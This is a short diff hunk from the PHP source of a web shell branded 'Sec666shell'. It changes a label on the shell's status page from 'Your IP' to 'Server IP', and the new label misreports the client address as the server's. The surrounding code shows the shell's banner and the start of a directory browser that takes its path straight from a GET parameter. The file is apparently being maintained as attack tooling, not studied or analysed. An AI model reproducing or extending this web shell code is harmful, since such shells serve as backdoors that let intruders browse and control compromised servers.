@@ -57,7 +57,7 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 <body>
 <center><br><h1 style="font-family: Calligraffitti;"><font color="white">Sec666shell</font></h1><center><br>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td><font color="white">Your IP : </font><font color="red">{ </font><font color="white">' . $_SERVER['REMOTE_ADDR'] . '</font><font color="red"> }</font></td></tr>
+<tr><td><font color="white">Server IP : </font><font color="red">{ </font><font color="white">' . $_SERVER['REMOTE_ADDR'] . '</font><font color="red"> }</font></td></tr>
 <tr><td><font color="white">Directory  : </font>';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
